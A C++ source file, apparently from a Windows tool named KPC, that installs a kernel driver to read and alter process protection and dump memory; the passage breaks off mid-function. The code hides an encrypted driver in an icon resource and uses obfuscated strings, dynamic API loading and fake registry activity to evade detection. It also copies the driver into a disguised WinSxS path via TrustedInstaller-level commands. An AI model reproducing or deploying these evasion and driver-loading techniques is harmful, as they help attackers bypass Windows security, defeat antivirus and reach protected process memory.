/*******************************************************************************
				██  ██ ██████  ████ 
				██ ██  ██  ██ ██    
				████   ██████ ██    
				██ ██  ██     ██    
				██  ██ ██      ████ 

  KPC - Kernel Process Control
  Advanced Windows Process Protection and Memory Dumping Tool
  Features Dynamic Kernel Driver Loading with Automatic Cleanup
  Achieves TrustedInstaller-level access bypassing Windows security restrictions

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

  -----------------------------------------------------------------------------
  License:
    KPC Custom License 1.0
    - Free for personal, non-commercial and academic use
    - A commercial license is required for business, enterprise or
      revenue-generating activities
    - Redistribution of source code allowed only with this header intact
    - The XOR decryption key for embedded drivers is not provided

  -----------------------------------------------------------------------------
DISCLAIMER:
    This software operates at Windows kernel level with elevated privileges.
    While designed to be safe, conflicts with antivirus software may cause
    system instability or BSOD. For optimal operation, add kpc.exe to your
    security software's exclusion list for both files and processes.
    
    The tool employs advanced anti-analysis techniques including XOR-based 
    string obfuscation, dynamic API loading, and runtime decryption to prevent
    static detection. All critical elements are reconstructed in memory only
    when needed, ensuring minimal security solution interference.
    
    Use responsibly. Author assumes no liability for system conflicts or misuse.

*******************************************************************************/

#include "Controller.h"
#include <shlwapi.h>
#include "common.h"
#include <algorithm>
#include <regex>
#include <charconv>
#include <DbgHelp.h>
#include <Shellapi.h>
#include <Shlobj.h>
#include <accctrl.h>
#include <aclapi.h>
#include <fstream>
#include <vector>
#include <cctype>
#include <tlhelp32.h>
#include <unordered_map>
#include <psapi.h>
#include "resource.h"


#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "DbgHelp.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Advapi32.lib")

volatile bool g_interrupted = false;

// ======================= Dynamic API Loading Globals =======================
HMODULE g_advapi32 = nullptr;
HMODULE g_kernel32 = nullptr;
decltype(&CreateServiceW) g_pCreateServiceW = nullptr;
decltype(&OpenServiceW) g_pOpenServiceW = nullptr;
decltype(&StartServiceW) g_pStartServiceW = nullptr;
decltype(&DeleteService) g_pDeleteService = nullptr;
decltype(&CreateFileW) g_pCreateFileW = nullptr;
decltype(&ControlService) g_pControlService = nullptr;

bool InitDynamicAPIs() noexcept {
    if (!g_advapi32) {
        auto advapi32Name = OBFAPI("advapi32.dll");
        g_advapi32 = LoadLibraryA(advapi32Name.c_str());
        if (!g_advapi32) return false;
        
        auto createServiceAPI = OBFAPI("CreateServiceW");
        g_pCreateServiceW = reinterpret_cast<decltype(&CreateServiceW)>(
            GetProcAddress(g_advapi32, createServiceAPI.c_str()));
            
        auto openServiceAPI = OBFAPI("OpenServiceW");
        g_pOpenServiceW = reinterpret_cast<decltype(&OpenServiceW)>(
            GetProcAddress(g_advapi32, openServiceAPI.c_str()));
            
        auto startServiceAPI = OBFAPI("StartServiceW");
        g_pStartServiceW = reinterpret_cast<decltype(&StartServiceW)>(
            GetProcAddress(g_advapi32, startServiceAPI.c_str()));
            
        auto deleteServiceAPI = OBFAPI("DeleteService");
        g_pDeleteService = reinterpret_cast<decltype(&DeleteService)>(
            GetProcAddress(g_advapi32, deleteServiceAPI.c_str()));
            
        auto controlServiceAPI = OBFAPI("ControlService");
        g_pControlService = reinterpret_cast<decltype(&ControlService)>(
            GetProcAddress(g_advapi32, controlServiceAPI.c_str()));
    }
    
    if (!g_kernel32) {
        auto kernel32Name = OBFAPI("kernel32.dll");
        g_kernel32 = GetModuleHandleA(kernel32Name.c_str());
        if (g_kernel32) {
            auto createFileAPI = OBFAPI("CreateFileW");
            g_pCreateFileW = reinterpret_cast<decltype(&CreateFileW)>(
                GetProcAddress(g_kernel32, createFileAPI.c_str()));
        }
    }
    
    return g_pCreateServiceW && g_pOpenServiceW && g_pStartServiceW && g_pDeleteService && g_pCreateFileW && g_pControlService;
}

std::string DecryptStr(const char* encrypted, size_t length, char key) {
    std::string result;
    result.reserve(length);
    for (size_t i = 0; i < length; i++) {
        result += char(encrypted[i] ^ key);
    }
    return result;
}

std::wstring DecryptWStr(const wchar_t* encrypted, size_t length, wchar_t key) {
    std::wstring result;
    result.reserve(length);
    for (size_t i = 0; i < length; i++) {
        result += wchar_t(encrypted[i] ^ key);
    }
    return result;
}

std::wstring GetServiceName() noexcept {
    // Runtime decryption to avoid static string detection
    return OBFSVC(L"kmpdc");
}

std::wstring GetDriverFileName() noexcept {
    // Modified driver file name to avoid signature detection
    return OBFPATH(L"KpcSrv.sys");
}

std::wstring GetWinSxSPath() noexcept {
    wchar_t windowsDir[MAX_PATH];
    if (GetWindowsDirectoryW(windowsDir, MAX_PATH) == 0) {
        // Fallback if GetWindowsDirectory fails
        wcscpy_s(windowsDir, L"C:\\Windows");
    }
    
    std::wstring result = windowsDir;
    auto winsxsSuffix = OBFPATH(L"\\WinSxS\\amd64_microsoft-windows-pdc-mw_31bf3856ad364e35_10.0.26100.1591_none_be920dc11d33a230");
    return result + winsxsSuffix;
}

void GenerateFakeActivity() noexcept {
    // Anti-analysis delays and fake registry operations to confuse behavioral detection
    HKEY hKey;
    auto currentVersionKey = OBFREG(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion");
    RegOpenKeyExW(HKEY_LOCAL_MACHINE, currentVersionKey.c_str(), 0, KEY_READ, &hKey);
    if (hKey) RegCloseKey(hKey);
    
    WIN32_FIND_DATAW findData;
    wchar_t systemDir[MAX_PATH];
		GetSystemDirectoryW(systemDir, MAX_PATH);
		std::wstring system32Pattern = std::wstring(systemDir) + L"\\*.dll";
    HANDLE hFind = FindFirstFileW(system32Pattern.c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) FindClose(hFind);
    
    Sleep(50 + (GetTickCount() % 100)); // Random delay for timing analysis evasion
}

// ======================= Anonymous Namespace - Helper Functions =======================
namespace {
    std::optional<DWORD> ParsePid(const std::wstring& pidStr) noexcept {
        if (pidStr.empty()) return std::nullopt;

        std::string narrowStr;
        narrowStr.reserve(pidStr.size());
        for (wchar_t wc : pidStr) {
            if (wc > 127) return std::nullopt;
            narrowStr.push_back(static_cast<char>(wc));
        }

        DWORD result = 0;
        auto [ptr, ec] = std::from_chars(narrowStr.data(), narrowStr.data() + narrowStr.size(), result);
        return (ec == std::errc{} && ptr == narrowStr.data() + narrowStr.size()) ? std::make_optional(result) : std::nullopt;
    }

    bool IsNumeric(const std::wstring& str) noexcept {
        if (str.empty()) return false;
        for (wchar_t ch : str) {
            if (ch < L'0' || ch > L'9') return false;
        }
        return true;
    }

    std::vector<BYTE> ReadResource(int resourceId, const wchar_t* resourceType) {
        HRSRC hRes = FindResource(nullptr, MAKEINTRESOURCE(resourceId), resourceType);
        if (!hRes) return {};
        
        HGLOBAL hData = LoadResource(nullptr, hRes);
        if (!hData) return {};
        
        DWORD dataSize = SizeofResource(nullptr, hRes);
        void* pData = LockResource(hData);
        
        return std::vector<BYTE>(static_cast<BYTE*>(pData), static_cast<BYTE*>(pData) + dataSize);
    }

    bool WriteFile(const std::wstring& path, const std::vector<BYTE>& data) {
        HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) return false;
        
        DWORD bytesWritten;
        BOOL success = ::WriteFile(hFile, data.data(), static_cast<DWORD>(data.size()), &bytesWritten, nullptr);
        CloseHandle(hFile);
        
        return success && bytesWritten == data.size();
    }

    // Enhanced process name resolution with multiple fallback methods
    std::wstring ResolveUnknownProcessLocal(DWORD pid, ULONG_PTR kernelAddress, UCHAR protectionLevel, UCHAR signerType) noexcept {
        static const std::unordered_map<DWORD, std::wstring> knownSystemPids = {
            {188, L"Secure System"},
            {232, L"Registry"}, 
            {3052, L"Memory Compression"},
            {3724, L"Memory Manager"},
            {256, L"VSM Process"},
            {264, L"VBS Process"},
            {288, L"Font Driver Host"},
            {296, L"User Mode Driver Host"}
        };

        if (auto it = knownSystemPids.find(pid); it != knownSystemPids.end()) {
            return it->second;
        }

        // Method 1: Direct process handle with extended access rights
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProcess) {
            wchar_t imageName[MAX_PATH] = {0};
            if (GetProcessImageFileNameW(hProcess, imageName, MAX_PATH)) {
                std::wstring fullPath(imageName);
                size_t lastSlash = fullPath.find_last_of(L'\\');
                if (lastSlash != std::wstring::npos) {
                    CloseHandle(hProcess);
                    return fullPath.substr(lastSlash + 1);
                }
            }

            DWORD size = MAX_PATH;
            wchar_t processPath[MAX_PATH] = {0};
            if (QueryFullProcessImageNameW(hProcess, 0, processPath, &size)) {
                std::wstring fullPath(processPath);
                size_t lastSlash = fullPath.find_last_of(L'\\');
                if (lastSlash != std::wstring::npos) {
                    CloseHandle(hProcess);
                    return fullPath.substr(lastSlash + 1);
                }
            }
            CloseHandle(hProcess);
        }

        // Method 2: Process snapshot enumeration (most reliable for system processes)
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe;
            pe.dwSize = sizeof(PROCESSENTRY32W);
            
            if (Process32FirstW(hSnapshot, &pe)) {
                do {
                    if (pe.th32ProcessID == pid) {
                        CloseHandle(hSnapshot);
                        return std::wstring(pe.szExeFile);
                    }
                } while (Process32NextW(hSnapshot, &pe));
            }
            CloseHandle(hSnapshot);
        }

        // Method 3: Protection-based classification system
        PS_PROTECTED_TYPE protection = static_cast<PS_PROTECTED_TYPE>(protectionLevel);
        PS_PROTECTED_SIGNER signer = static_cast<PS_PROTECTED_SIGNER>(signerType);
        
        if (protection == PS_PROTECTED_TYPE::Protected && signer == PS_PROTECTED_SIGNER::WinSystem) {
            return (pid < 300) ? L"Kernel System Process" : L"Protected System Service";
        }
        
        if (protection == PS_PROTECTED_TYPE::ProtectedLight && signer == PS_PROTECTED_SIGNER::WinTcb) {
            return (pid < 500) ? L"Core System Service" : L"Trusted System Service";
        }
        
        if (protection == PS_PROTECTED_TYPE::Protected && signer == PS_PROTECTED_SIGNER::Windows) {
            return L"Windows System Component";
        }
        
        if (protection == PS_PROTECTED_TYPE::ProtectedLight && signer == PS_PROTECTED_SIGNER::Windows) {
            return L"Windows Service";
        }

        if (pid >= 8 && pid <= 96 && pid % 4 == 0) {
            return L"Kernel Worker";
        }
        
        if (pid >= 100 && pid <= 300) {
            return L"Early System Process";
        }

        return L"Process_" + std::to_wstring(pid);
    }
}

// ======================= Constructor & Destructor =======================
Controller::Controller() : m_rtc(std::make_unique<KpcDrv>()), m_of(std::make_unique<OffsetFinder>()) {
    if (!m_of->FindAllOffsets()) {
        ERROR(L"Failed to find required kernel structure offsets");
    }
    // Note: Driver is loaded on-demand for each operation (atomic pattern)
}

Controller::~Controller() {
    // Ensure clean shutdown with proper driver cleanup
    // (Atomic operations handle their own cleanup)
}

// ======================= Atomic Operation Management System =======================

bool Controller::PerformAtomicCleanup() noexcept {
    // Step 1: CRITICAL - Close device handle before unloading driver to prevent BSOD
    if (m_rtc) {
        m_rtc->Cleanup();
    }
    
    // Step 2: Force handle flush - allow kernel time for cleanup
    Sleep(150);
    
    // Step 3: Stop driver service gracefully
    if (!StopDriverService()) {
        ERROR(L"Failed to stop driver service during cleanup");
    }
    
    // Step 4: CRITICAL - Verify service actually stopped before uninstall
    bool serviceVerified = false;
    if (InitDynamicAPIs()) {
        for(int attempt = 0; attempt < 15; attempt++) {
            SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
            if (hSCM) {
                SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), SERVICE_QUERY_STATUS);
                if (hService) {
                    SERVICE_STATUS status;
                    if (QueryServiceStatus(hService, &status)) {
                        if (status.dwCurrentState == SERVICE_STOPPED) {
                            serviceVerified = true;
                            CloseServiceHandle(hService);
                            CloseServiceHandle(hSCM);
                            break;
                        }
                    }
                    CloseServiceHandle(hService);
                } else {
                    // Service doesn't exist means it's stopped
                    serviceVerified = true;
                    CloseServiceHandle(hSCM);
                    break;
                }
                CloseServiceHandle(hSCM);
            }
            Sleep(100);  // Wait before next verification attempt
        }
    }
    
    // Step 5: Verify device handle is completely closed
    for(int attempt = 0; attempt < 10; attempt++) {
        auto devicePath = L"\\\\.\\" + GetServiceName();
        HANDLE testHandle = CreateFileW(devicePath.c_str(), 
                                      GENERIC_READ, 0, nullptr, 
                                      OPEN_EXISTING, 0, nullptr);
        if (testHandle == INVALID_HANDLE_VALUE) {
            // Driver device inaccessible - cleanup successful
            break;
        }
        CloseHandle(testHandle);
        Sleep(100);
    }
    
    // Step 6: Only uninstall if service is verified stopped
    if (serviceVerified) {
        UninstallDriver();
    }
    
    // Step 7: Extra delay before recreating instance - CRITICAL for stability
    Sleep(300);
    
    // Step 8: Recreate driver instance for next operation
    m_rtc = std::make_unique<KpcDrv>();
    
    SUCCESS(L"Departed from kernel mode (Ring 0), returned to user space");
    return true;
}

bool Controller::PerformAtomicInit() noexcept {
    // Load and initialize driver for atomic operation
    if (!EnsureDriverAvailable()) {
        ERROR(L"Failed to load driver for atomic operation");
        return false;
    }
    
    return true;
}

bool Controller::PerformAtomicInitWithErrorCleanup() noexcept {
    if (!PerformAtomicInit()) {
        PerformAtomicCleanup();
        return false;
    }
    return true;
}
// ======================= Core Driver Management System =======================

bool Controller::EnsureDriverAvailable() noexcept {
    if (m_rtc->Initialize()) {
        auto testRead = m_rtc->Read32(0x1000);
        if (testRead.has_value() || GetLastError() != ERROR_FILE_NOT_FOUND) {
            return true;
        }
    }
	
	if (!InitDynamicAPIs()) return false;
	GenerateFakeActivity();
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), SERVICE_QUERY_STATUS | SERVICE_START);
        if (hService) {
            SERVICE_STATUS status;
            if (QueryServiceStatus(hService, &status) && status.dwCurrentState == SERVICE_STOPPED) {
                g_pStartServiceW(hService, 0, nullptr);
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCM);
                Sleep(500);
                if (m_rtc->Initialize()) {
                    return true;
                }
            }
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }
	std::wstring driverPath = GetWinSxSPath() + L"\\" + GetDriverFileName();
	if (GetFileAttributesW(driverPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
		if (RegisterDriverServiceSilent(driverPath) && StartDriverServiceSilent()) {
			if (m_rtc->Initialize()) {
				return true;
			}
		}
	}
    INFO(L"Initializing kernel driver component...");
    
    if (!InstallDriverSilently()) {
        ERROR(L"Failed to install kernel driver component");
        return false;
    }

    if (!StartDriverServiceSilent()) {
        ERROR(L"Failed to start kernel driver service");
        return false;
    }

    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize kernel driver communication");
        return false;
    }

    SUCCESS(L"Kernel driver component initialized successfully");
    return true;
}

bool Controller::StopDriverService() noexcept {
    if (!InitDynamicAPIs()) return false;
	GenerateFakeActivity();
	SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        return true; // Not an error if SCM unavailable
    }

    SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return true; // Service doesn't exist - already clean
    }

    SERVICE_STATUS status;
    if (QueryServiceStatus(hService, &status)) {
        if (status.dwCurrentState == SERVICE_STOPPED) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return true; // Already stopped
        }
    }

    SERVICE_STATUS stopStatus;
    BOOL success = g_pControlService(hService, SERVICE_CONTROL_STOP, &stopStatus);
    DWORD err = GetLastError();

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    return success || err == ERROR_SERVICE_NOT_ACTIVE;
}

// ======================= Driver Resource Management =======================

std::vector<BYTE> Controller::ExtractEncryptedDriver() noexcept {
    auto icoData = ReadResource(IDR_MAINICON, RT_RCDATA);
    if (icoData.size() <= 9662) {
        ERROR(L"Icon resource too small or corrupted - steganographic driver missing");
        return {};
    }
    // Extract embedded driver data from icon resource (steganography)
    return std::vector<BYTE>(icoData.begin() + 9662, icoData.end());
}

std::vector<BYTE> Controller::DecryptDriver(const std::vector<BYTE>& encryptedData) noexcept {
    if (encryptedData.empty()) {
        ERROR(L"No encrypted driver data provided");
        return {};
    }

    // Obfuscated decryption key to avoid static analysis
    auto decryptionKey = OBFSTR("[REDACTED]");
    std::vector<BYTE> decryptedData = encryptedData;
    
    for (size_t i = 0; i < decryptedData.size(); ++i) {
        decryptedData[i] ^= decryptionKey[i % decryptionKey.size()];
    }
    
    return decryptedData;
}

bool Controller::InstallDriverSilently() noexcept {
    auto encryptedData = ExtractEncryptedDriver();
    if (encryptedData.empty()) return false;
    
    auto driverData = DecryptDriver(encryptedData);
    if (driverData.empty()) return false;

    wchar_t tempDir[MAX_PATH];
	if (GetTempPathW(MAX_PATH, tempDir) == 0) {
		// Fallback to Windows\Temp if GetTempPath fails
		wchar_t windowsDir[MAX_PATH];
		GetWindowsDirectoryW(windowsDir, MAX_PATH);
		swprintf_s(tempDir, L"%s\\Temp\\", windowsDir);
	}
	std::wstring tempPath = tempDir;
    std::wstring tempDriverPath = tempPath + GetDriverFileName();
    if (!WriteFile(tempDriverPath, driverData)) return false;

    std::wstring driverDir = GetWinSxSPath();
    std::wstring driverPath = driverDir + L"\\" + GetDriverFileName();

    auto mkdirCmd = OBFPATH(L"cmd.exe /c md \"");
    std::wstring mkdirCommand = mkdirCmd + driverDir + L"\"";
    RunAsTrustedInstallerSilent(mkdirCommand);
    
    auto copyCmd = OBFPATH(L"cmd.exe /c copy /Y \"");
    std::wstring copyCommand = copyCmd + tempDriverPath + L"\" \"" + driverPath + L"\"";
    if (!RunAsTrustedInstallerSilent(copyCommand)) {
        DeleteFileW(tempDriverPath.c_str());
        return false;
    }

    DWORD fileAttribs = GetFileAttributesW(driverPath.c_str());
    if (fileAttribs == INVALID_FILE_ATTRIBUTES) {
        DeleteFileW(tempDriverPath.c_str());
        return false;
    }

    DeleteFileW(tempDriverPath.c_str());
    return RegisterDriverServiceSilent(driverPath);
}

bool Controller::RegisterDriverServiceSilent(const std::wstring& driverPath) noexcept {
    if (!InitDynamicAPIs()) return false;
	GenerateFakeActivity();
	SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;

    auto serviceDisplayName = OBFSVC(L"Helper Service");
    SC_HANDLE hService = g_pCreateServiceW(
        hSCM, GetServiceName().c_str(), serviceDisplayName.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL, driverPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr
    );

    bool success = (hService != nullptr) || (GetLastError() == ERROR_SERVICE_EXISTS);
    
    if (hService) CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return success;
}

bool Controller::StartDriverServiceSilent() noexcept {
    if (!InitDynamicAPIs()) return false;
	GenerateFakeActivity();
	SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;

    SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return false;
    }

    SERVICE_STATUS status;
    bool success = true;
    
    if (QueryServiceStatus(hService, &status)) {
        if (status.dwCurrentState != SERVICE_RUNNING) {
            success = g_pStartServiceW(hService, 0, nullptr) || (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING);
        }
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return success;
}

// ======================= Driver Status Checking =======================

bool Controller::IsDriverCurrentlyLoaded() noexcept {
    if (!m_rtc) return false;
    
    // Check if device handle is open and functional
    if (!m_rtc->IsConnected()) return false;
    
    // Additional test - attempt read from safe memory address
    auto testRead = m_rtc->Read32(0x1000);
    return testRead.has_value() || GetLastError() != ERROR_FILE_NOT_FOUND;
}

// ======================= Legacy Driver Management (Compatibility) =======================

bool Controller::InstallDriver() noexcept {
    auto encryptedData = ExtractEncryptedDriver();
    if (encryptedData.empty()) {
        ERROR(L"Failed to extract encrypted driver from icon resource");
        return false;
    }
    
    auto driverData = DecryptDriver(encryptedData);
    if (driverData.empty()) {
        ERROR(L"Failed to decrypt embedded driver data");
        return false;
    }

    wchar_t tempDir[MAX_PATH];
	if (GetTempPathW(MAX_PATH, tempDir) == 0) {
		// Fallback to Windows\Temp if GetTempPath fails
		wchar_t windowsDir[MAX_PATH];
		GetWindowsDirectoryW(windowsDir, MAX_PATH);
		swprintf_s(tempDir, L"%s\\Temp\\", windowsDir);
	}
	std::wstring tempPath = tempDir;
    std::wstring tempDriverPath = tempPath + GetDriverFileName();
    if (!WriteFile(tempDriverPath, driverData)) {
        ERROR(L"Failed to write driver file to temp location: %s", tempDriverPath.c_str());
        return false;
    }

    std::wstring driverDir = GetWinSxSPath();
    std::wstring driverPath = driverDir + L"\\" + GetDriverFileName();

    auto mkdirCmd = OBFPATH(L"cmd.exe /c md ");
    std::wstring mkdirCommand = mkdirCmd + driverDir;
    INFO(L"Creating directory with elevated privileges: %s", mkdirCommand.c_str());
    
    if (!RunAsTrustedInstaller(mkdirCommand)) {
        INFO(L"Directory creation failed (may already exist)");
    }

    auto copyCmd = OBFPATH(L"cmd.exe /c copy /Y ");
    std::wstring copyCommand = copyCmd + tempPath + GetDriverFileName() + L" " + driverPath;
    INFO(L"Copying driver with elevated privileges: %s", copyCommand.c_str());

    if (!RunAsTrustedInstaller(copyCommand)) {
        ERROR(L"Failed to copy driver to system directory with elevated privileges");
        DeleteFileW(tempDriverPath.c_str());
        return false;
    }

    DWORD fileAttribs = GetFileAttributesW(driverPath.c_str());
    if (fileAttribs == INVALID_FILE_ATTRIBUTES) {
        ERROR(L"Driver file was not copied successfully to: %s", driverPath.c_str());
        ERROR(L"GetFileAttributes error: %d", GetLastError());
        DeleteFileW(tempDriverPath.c_str());
        return false;
    }

    SUCCESS(L"Driver file successfully copied to: %s", driverPath.c_str());
    DeleteFileW(tempDriverPath.c_str());

    if (!InitDynamicAPIs()) return false;
	GenerateFakeActivity();
	SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        ERROR(L"Failed to open service control manager: %d", GetLastError());
        return false;
    }

    auto serviceDisplayName = OBFSVC(L"Memory Access Driver");
    SC_HANDLE hService = g_pCreateServiceW(
        hSCM, GetServiceName().c_str(), serviceDisplayName.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL, driverPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr
    );

    if (!hService) {
        DWORD err = GetLastError();
        CloseServiceHandle(hSCM);
        
        if (err != ERROR_SERVICE_EXISTS) {
            ERROR(L"Failed to create driver service: %d", err);
            return false;
        }
        
        INFO(L"Driver service already exists, proceeding");
    } else {
        CloseServiceHandle(hService);
        SUCCESS(L"Driver service created successfully");
    }

    CloseServiceHandle(hSCM);
    SUCCESS(L"Driver installed and registered as Windows service");
    return true;
}

bool Controller::UninstallDriver() noexcept {
    StopDriverService();

    if (!InitDynamicAPIs()) return true;

    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        return true; // Not an error if SCM unavailable
    }

    std::wstring serviceName = GetServiceName();
    SC_HANDLE hService = g_pOpenServiceW(hSCM, serviceName.c_str(), DELETE);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return true; // Service doesn't exist, already clean
    }

    BOOL success = g_pDeleteService(hService);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    if (!success) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_MARKED_FOR_DELETE) {
            ERROR(L"Failed to delete driver service: %d", err);
            return false;
        }
    }

    // Remove driver file using obfuscated path
    std::wstring driverPath = GetWinSxSPath() + L"\\" + GetDriverFileName();
    if (!DeleteFileW(driverPath.c_str())) {
        DWORD err = GetLastError();
        if (err != ERROR_FILE_NOT_FOUND) {
            // Try with elevated privileges if regular delete fails
            auto delCmd = OBFPATH(L"cmd.exe /c del /Q \"");
            std::wstring delCommand = delCmd + driverPath + L"\"";
            RunAsTrustedInstallerSilent(delCommand);
        }
    }

    return true;
}

bool Controller::StartDriverService() noexcept {
    if (!InitDynamicAPIs()) return false;
	GenerateFakeActivity();
	SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        ERROR(L"Failed to open service control manager: %d", GetLastError());
        return false;
    }

    SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hService) {
        CloseServiceHandle(hSCM);
        ERROR(L"Failed to open kernel driver service: %d", GetLastError());
        return false;
    }

    SERVICE_STATUS status;
    if (QueryServiceStatus(hService, &status)) {
        if (status.dwCurrentState == SERVICE_RUNNING) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            INFO(L"Kernel driver service already running");
            return true;
        }
    }

    BOOL success = g_pStartServiceW(hService, 0, nullptr);
    DWORD err = GetLastError();

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    if (!success && err != ERROR_SERVICE_ALREADY_RUNNING) {
        ERROR(L"Failed to start kernel driver service: %d", err);
        return false;
    }

    SUCCESS(L"Kernel driver service started successfully");
    return true;
}
// ======================= Process Name Resolution (Driver-Free) =======================

std::optional<ProcessMatch> Controller::ResolveNameWithoutDriver(const std::wstring& processName) noexcept {
    auto matches = FindProcessesByNameWithoutDriver(processName);
    
    if (matches.empty()) {
        ERROR(L"No process found matching pattern: %s", processName.c_str());
        return std::nullopt;
    }
    
    if (matches.size() == 1) {
        INFO(L"Found process: %s (PID %d)", matches[0].ProcessName.c_str(), matches[0].Pid);
        return matches[0];
    }
    
    ERROR(L"Multiple processes found matching pattern '%s'. Please use a more specific name:", processName.c_str());
    for (const auto& match : matches) {
        std::wcout << L"  PID " << match.Pid << L": " << match.ProcessName << L"\n";
    }
    
    return std::nullopt;
}

std::vector<ProcessMatch> Controller::FindProcessesByNameWithoutDriver(const std::wstring& pattern) noexcept {
    std::vector<ProcessMatch> matches;
    
    // Use process snapshot instead of kernel driver for lightweight resolution
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return matches;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            std::wstring processName = pe.szExeFile;
            
            if (IsPatternMatch(processName, pattern)) {
                ProcessMatch match;
                match.Pid = pe.th32ProcessID;
                match.ProcessName = processName;
                match.KernelAddress = 0; // Will be resolved by atomic operation if needed
                matches.push_back(match);
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    
    CloseHandle(hSnapshot);
    return matches;
}

// ======================= Kernel Process Operations =======================

std::optional<ULONG_PTR> Controller::GetInitialSystemProcessAddress() noexcept {
    auto kernelBase = Utils::GetKernelBaseAddress();
    if (!kernelBase) return std::nullopt;

    auto offset = m_of->GetOffset(Offset::KernelPsInitialSystemProcess);
    if (!offset) return std::nullopt;

    ULONG_PTR pPsInitialSystemProcess = Utils::GetKernelAddress(kernelBase.value(), offset.value());
    return m_rtc->ReadPtr(pPsInitialSystemProcess);
}

std::optional<ULONG_PTR> Controller::GetProcessKernelAddress(DWORD pid) noexcept {
    auto processes = GetProcessList();
    for (const auto& entry : processes) {
        if (entry.Pid == pid)
            return entry.KernelAddress;
    }
    
    ERROR(L"Failed to find kernel address for PID %d", pid);
    return std::nullopt;
}

std::vector<ProcessEntry> Controller::GetProcessList() noexcept {
    std::vector<ProcessEntry> processes;
    
    // Early interruption check - before starting expensive enumeration
    extern volatile bool g_interrupted;
    if (g_interrupted) {
        INFO(L"Process enumeration cancelled by user before start");
        return processes;
    }
    
    auto initialProcess = GetInitialSystemProcessAddress();
    if (!initialProcess) return processes;

    auto uniqueIdOffset = m_of->GetOffset(Offset::ProcessUniqueProcessId);
    auto linksOffset = m_of->GetOffset(Offset::ProcessActiveProcessLinks);
    
    if (!uniqueIdOffset || !linksOffset) return processes;

    ULONG_PTR current = initialProcess.value();
    DWORD processCount = 0;

    do {
        // Critical interruption check in enumeration loop - can be long operation
        if (g_interrupted) {
            DEBUG(L"Process enumeration cancelled by user (found %d processes so far)", processCount);
            break; // Exit gracefully, return partial results
        }

        // REMOVED: Annoying periodic progress messages - they spam during multiple enumerations

        auto pidPtr = m_rtc->ReadPtr(current + uniqueIdOffset.value());
        
        // Check interruption before expensive protection read operation
        if (g_interrupted) {
            DEBUG(L"Process enumeration cancelled during PID read (processed %d entries)", processCount);
            break;
        }
        
        auto protection = GetProcessProtection(current);
        
        std::optional<UCHAR> signatureLevel = std::nullopt;
        std::optional<UCHAR> sectionSignatureLevel = std::nullopt;
        
        auto sigLevelOffset = m_of->GetOffset(Offset::ProcessSignatureLevel);
